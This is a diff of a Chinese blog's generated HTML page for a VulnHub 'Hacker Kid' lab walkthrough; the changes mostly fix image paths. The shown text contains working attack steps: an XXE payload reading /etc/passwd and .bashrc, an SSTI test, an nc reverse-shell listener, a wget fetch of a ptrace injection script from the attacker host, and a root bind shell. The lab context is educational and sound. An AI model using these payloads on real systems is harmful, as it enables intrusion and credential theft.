@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"LazySysAdmin靶场渗透","path":"2025/10/13/LazySysAdmin靶场渗透/"},{"title":"CSRF","path":"2025/08/24/CSRF/"},{"title":"XXE","path":"2025/08/16/XXE/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"pop","path":"2025/07/07/pop/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"渗透测试值工具kali","path":"2025/10/26/渗透测试工具kali/"},{"title":"vulnhub靶场HACKER KID:1.0.1","path":"2025/10/31/vulnhub靶场HACKER-KID-1-0-1/"}]`)
+  const posts = JSON.parse(`[{"title":"CSRF","path":"2025/08/24/CSRF/"},{"title":"LazySysAdmin靶场渗透","path":"2025/10/13/LazySysAdmin靶场渗透/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"XXE","path":"2025/08/16/XXE/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"pop","path":"2025/07/07/pop/"},{"title":"vulnhub靶场HACKER KID:1.0.1","path":"2025/10/31/vulnhub靶场HACKER-KID-1-0-1/"},{"title":"渗透测试值工具kali","path":"2025/10/26/渗透测试工具kali/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -380,50 +380,50 @@
 <p>靶场安装：</p>
 <p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova">https://download.vulnhub.com/hackerkid/Hacker_Kid-v1.0.1.ova</a></p>
 <p>导入</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/425f5ed425534affb7c08336d2b51258-17616646744101-17616648787372.png" alt="425f5ed425534affb7c08336d2b51258"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/425f5ed425534affb7c08336d2b51258-17616646744101-17616648787372.png" alt="425f5ed425534affb7c08336d2b51258"></p>
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>扫描同网段下所有存活的主机（工具：kali） 因为靶机现在是NAT模式，并且我的VM也是自动获取ip的模式，所以在VM打开靶机之后，靶机就会被分 配一个ip地址，现在我们要得到这个ip</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.240.0/24</span><br></pre></td></tr></table></figure>
 
 <p>一直扫不出来，后来发现kali又出现问题了，eth0状态为不可用，我的网络根本用不了，经过长期的排错，我发现是物理主机的VMware NAT Service之前是停止状态的，给他重启一下就行了，eth0有线连接就又恢复了，验证，发现物理主机和虚拟机能互相ping通了</p>
 <p>下面重新开始扫本网段存活的主机</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/image-20251029225612834-17617497741671.png" alt="image-20251029225612834"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/image-20251029225612834-17617497741671.png" alt="image-20251029225612834"></p>
 <p>已经可以看到我们的靶机ip了192.168.240.130</p>
 <h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.240.130</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/image-20251029230836993-17617505182672.png" alt="image-20251029230836993"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/image-20251029230836993-17617505182672.png" alt="image-20251029230836993"></p>
 <p>我们看到开放的端口有53，80，9999，53是dns的服务端口，80是http服务默认端口</p>
 <h4 id="收集页面信息"><a href="#收集页面信息" class="headerlink" title="收集页面信息"></a>收集页面信息</h4><p>从最常见的80端口入手</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/010d9f07ff7270331a61b7de257c54e3.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/010d9f07ff7270331a61b7de257c54e3.png" alt="img"></p>
 <p>这个页面表面上看是没啥提示的，但是他说你越深挖我，就越能在你的服务器上找到我……继续挖我……继续挖我。</p>
 <p>说明可能还有啥隐藏起来的信息，那在这个界面我们就看看页面源码</p>
 <p>页面源码里面有两段注释代码，可以发现第二段给了提示</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/c805f082442ec49e31af348235d54690.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/c805f082442ec49e31af348235d54690.png" alt="img"></p>
 <p>他说使用 GET 参数 page_no 来查看页面。</p>
 <p>那我们可以尝试在 URL 中加入 ?page_no&#x3D;数字 来访问不同页面。</p>
 <p>但是这么多数字我们手动一一来访问看页面有有没有有用的信息太慢了，我们直接用bp来爆破一下</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/a2a51ade75b16c504ade80507cb71948.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/a2a51ade75b16c504ade80507cb71948.png" alt="img"></p>
 <p>我们先访问一下page_no&#x3D;1发起请求，用bp拦截，拦下这个数据包后我们把这个数据包发到intruder这个模块开始爆破，</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/image-20251030201150701-17618263121501.png" alt="image-20251030201150701"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/image-20251030201150701-17618263121501.png" alt="image-20251030201150701"></p>
 <p>配置好各项参数开始爆破</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/ebad1e492279cb2a581cbc8a6d986195.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/ebad1e492279cb2a581cbc8a6d986195.png" alt="img"></p>
 <p>爆破完成发现page_no&#x3D;21这个响应明显更大一些，肯定有信息，去访问一下</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/c9897c4112ae74f6b3628d4a3ea4b3fc.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/c9897c4112ae74f6b3628d4a3ea4b3fc.png" alt="img"></p>
 <p>发现一个域名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackers.blackhat.local</span><br></pre></td></tr></table></figure>
 
 <p>先放放，再去看看9999端口的那个界面下有啥</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/870848f08e76b510f4a182987981b6d7.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/870848f08e76b510f4a182987981b6d7.png" alt="img"></p>
 <p>可以看到是一个登录界面，但是因为没有账号和密码，无法登录使用</p>
 <p>所以我们就要继续深挖刚才扫出来的域名</p>
 <p>用dig结合我们刚得到的域名继续挖掘信息（知道域名了，那就看看有没有对应的ip）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig hackers.blackhat.local @192.168.240.130</span><br></pre></td></tr></table></figure>
 
 <p>因为要继续通过我们刚得到的域名挖，那就是查询目标是hackers.blackhat.local,这个域名是通过靶机下的页面找到的，那就手动指定服务器ip为靶机ip</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/35181c1ddd83da25df2ba305f32d5bcf.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/35181c1ddd83da25df2ba305f32d5bcf.png" alt="img"></p>
 <p>这次查询得知了我们这次查的域名居然是不存在的，那更别提查这个域名的IP了，但是没关系啊，刚才的权威回答告诉我们虽然这个域名不存在，但是blackhat.local这个DNS区是真实存在的，而且他的权威服务器就是我们的靶机，那我们就能换条路走了</p>
 <p>我们用axfr去拉取整个blackhat.localDNS区域的全部记录</p>
 <p>AXFR（DNS区域传输）：axfr 是q类型的一种: axfr类型是Authoritative Transfer的缩写，指请求传送 某个区域的全部记录。</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/02908b9c7edce903d94b425e620cee02.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/02908b9c7edce903d94b425e620cee02.png" alt="img"></p>
 <p>这里我们能看到好多子域，但是他们都指向了192.168.14.143，目前来说我已经知道这些子域的子域ip是192.168.14.143，我去访问了这个ip，根本访问不了，那大概率这些子域不是我们要关注的主要对象</p>
 <p>此时发现还有一个域名突然出现了</p>
 <p>hackerkid.blackhat.local 是 AXFR 回显里唯一之前没出现过、且拼写正常的纯域名</p>
@@ -438,21 +438,21 @@
 <p>不写 &#x2F; 不改动<br>→ 系统去公网 DNS 问 .local<br>→ 根、顶级域都不认，最终 NXDOMAIN<br>→ 浏览器报 “无法解析域名” 或 “DNS_PROBE_FINISHED_NXDOMAIN”，根本发不出 HTTP 请求。</p>
 <p>因为我是在windos上进行渗透测试的，所以我直接在</p>
 <p>C:\Windows\System32\drivers\etc\hosts上加这两行域名。</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/1203565a7d19d94222227463dcda31a7.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/1203565a7d19d94222227463dcda31a7.png" alt="img"></p>
 <h5 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h5><p>直接访问我们刚记下的域名之后发现一个登录界面</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/336e4794d2cb6152271e2f964e1cae99.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/336e4794d2cb6152271e2f964e1cae99.png" alt="img"></p>
 <p>随便输入点信息后提交并且提起准备好bp开始抓包</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/ca7a209dc6dc1565b879994b547c968b.png" alt="img"></p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/0b953904e955f93fe51034a472d79003.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/ca7a209dc6dc1565b879994b547c968b.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/0b953904e955f93fe51034a472d79003.png" alt="img"></p>
 <p>抓到数据包，发现是xml格式的，看到xml格式的数据包就要开始想是否存在xxe漏洞，这里我们</p>
 <p>测试一下看看有没有回显位，根据我们刚刚提交的信息得到的回应最有可能回显位就是email处，这里验证一下</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/44cd0da81c6d9888e04e72d7e8c2ce75.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/44cd0da81c6d9888e04e72d7e8c2ce75.png" alt="img"></p>
 <p>测处email处就是回显位</p>
 <p>既然真的存在xxe漏洞，那我们就利用它去读取一下我们本地敏感文件</p>
 <p>构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ZY [</span><br><span class="line">        &lt;!ENTITY ddd SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        &amp;ddd;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/6f5dc96b5d98b2be5dc84109e2c79769.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/6f5dc96b5d98b2be5dc84109e2c79769.png" alt="img"></p>
 <p>我们用payload读取了靶机的全部用户，发现除了root用户，还有一个用户saket也有登录bash的权限，在众多用户都没有登录权限的时候，saket用户有，他直接脱颖而出，那必须得好好利用一下</p>
 <p>查看他的.bashrc文件看看里面是否有能利用的信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bashrc 就是 每次打开新 bash 终端时自动执行的“个人启动脚本”，里面通常是环境变量 + 别名 + 函数 + 提示符美化，偶尔夹带密码/后门/横向移动线索。</span><br><span class="line">Bash 就是 Linux 的‘命令行操作系统’；谁有 /bin/bash，谁就能开终端、跑脚本、留后门</span><br></pre></td></tr></table></figure>
@@ -461,22 +461,22 @@
 <p>我用了file协议没读出来，下面尝试一下php协议</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/c535c1feaeda189c45346d5ee0f82656.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/c535c1feaeda189c45346d5ee0f82656.png" alt="img"></p>
 <p>成功带出.bashrc文件，去base64解码</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/a978997bff29369e40beab8abb2016f4.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/a978997bff29369e40beab8abb2016f4.png" alt="img"></p>
 <p>发现一组username，password</p>
 <p>想到上面用的9999端口拿到的登录界面，拿去登录一下</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/dfb3d92561c6bdc3fc3f8e4f187c22b1.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/dfb3d92561c6bdc3fc3f8e4f187c22b1.png" alt="img"></p>
 <p>搞啥啊，居然登不上</p>
 <p>但是我坚信这组信息包有用的啊，经过尝试，发现把用户名换成<code>saket</code>就可以了。。。。</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/723241dcd64b8cc605b212696d2f497d.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/723241dcd64b8cc605b212696d2f497d.png" alt="img"></p>
 <p>页面提示，让我们告诉它名字，那就想到get传参</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/35953e8f9f2dd8b884fbefb246ba7bf5.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/35953e8f9f2dd8b884fbefb246ba7bf5.png" alt="img"></p>
 <h5 id="SSTI模板注入-反弹shell"><a href="#SSTI模板注入-反弹shell" class="headerlink" title="SSTI模板注入+反弹shell"></a>SSTI模板注入+反弹shell</h5><p>结合前面<code>nmap</code>扫描扫出来的信息知道这是一个基于tornado框架的web服务器，并且前面已经测试过了有get传参，敏感一点，看看是否有ssti模板注入漏洞</p>
 <p>测试一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/badf539749d57090c480130e2281281e.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/badf539749d57090c480130e2281281e.png" alt="img"></p>
 <p>执行了，确认存在ssti模板注入漏洞</p>
 <p>那我们利用ssti来进行反弹shell</p>
 <p><strong>利用ssti模板注入漏洞进行反弹shell的原因</strong></p>
@@ -491,7 +491,7 @@
 <p>在kali上监听6677端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6677</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/88490531427b3f54bbe71fdd4185137b.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/88490531427b3f54bbe71fdd4185137b.png" alt="img"></p>
 <p>成功反弹shell</p>
 <p>拿到saket用户的低权shell，后面继续提权，拿到root权限</p>
 <h3 id="提权（Capabilitie）"><a href="#提权（Capabilitie）" class="headerlink" title="提权（Capabilitie）"></a>提权（<code>Capabilitie</code>）</h3><p><code>Capabilitie</code>是一个Linux内核的功能，是做权限管理用的</p>
@@ -605,12 +605,12 @@
 <p>放上去发现报错，提示没有将<code>getcap</code>加入到环境里面</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null   指定完整的路径再次查询</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/56cd889f6c26c8845f614caa4a627d3b.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/56cd889f6c26c8845f614caa4a627d3b.png" alt="img"></p>
 <p>发现了python2设置了<code>ptrace</code>，根据上面的学习我们知道<code>ptrace</code>是具有任意进程（包括root进程）调试的能力的</p>
 <p>那我们下一步就是找活着的root进程</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aef | grep root</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/4f432f94c5ba9a5a329677767a90f88d.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/4f432f94c5ba9a5a329677767a90f88d.png" alt="img"></p>
 <p>找到了很多我们选择利用阿帕奇（当然选其他进程也是可以的，但是需要这个进程的进程号不能太大且需要长期守护）</p>
 <p>这里解释一下为啥选阿帕奇这个root进程</p>
 <p>1.长期守护、root UID、无 seccomp（&#x2F;proc&#x2F;705&#x2F;status 无 Seccomp 字段）<br>2.动态链接（有 libc &amp; ld.so）→ 方便调用 dlopen<br>3.默认没开 PR_SET_DUMPABLE → 允许 ptrace attach</p>
@@ -622,18 +622,18 @@
 <p>“这个脚本就像‘远程遥控器’：先让 root 程序暂停，把一段‘自动连回你电脑并开 shell’的小程序贴到它脑子里，再让它继续跑——root 程序自己就变成你的 root Shell 了。”</p>
 <p>1.attach &#x3D; 按暂停键 →  root 进程不能动。<br>2.写 shellcode &#x3D; 把“开放 5600 端口 + 开 bash”的二进制指令贴进它脑袋。<br>3.改指针 &#x3D; 告诉它“从这条新指令继续跑”。</p>
 <p>首先先把这个脚本写在kali本地，然后Kali开启HTTP服务，允许靶机把我们刚写的脚本下载下来</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/b80ef386c79524bef7b278d0062bef2b.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/b80ef386c79524bef7b278d0062bef2b.png" alt="img"></p>
 <p>靶机从Kali上下载下来刚刚的脚本</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.240.99/zz.py</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/cfa3274b06e46c2ae6b5796eade7e2de.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/cfa3274b06e46c2ae6b5796eade7e2de.png" alt="img"></p>
 <p>使用python2.7的<code>sys_ptrace</code>权限，将我们的进程注入脚本zz.py注入到刚才发现的以root权限运行的阿帕奇进程中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 zz.py 884</span><br></pre></td></tr></table></figure>
 
 <p><code>zz.py</code>把自己的后门进程注入到<code>root</code>的<code>apache</code>进程里面之后，它会在本机开启一个侦听端口<code>5600</code><br><code>ss -pantu | grep 5600</code>看一下是否开启了5600端口，如果开启了的话，说明我们的注入成功了，这个后门的进程注入已经被启动了</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/096d5af227c939cddf10309096105312.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/096d5af227c939cddf10309096105312.png" alt="img"></p>
 <p><code>nc 192.168.240.130 5600</code>，我们直接连接</p>
-<p><img src="/2025/10/13/LazySysAdmin%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/ID-1-0-1/87fdb6bca24ae054186e957c263c1be3.png" alt="img"></p>
+<p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/87fdb6bca24ae054186e957c263c1be3.png" alt="img"></p>
 <p>成功提权</p>
 <p>**注入完成 → 靶机开放 5600 且已 root → Kali 连 5600 → 提权成功。</p>
 
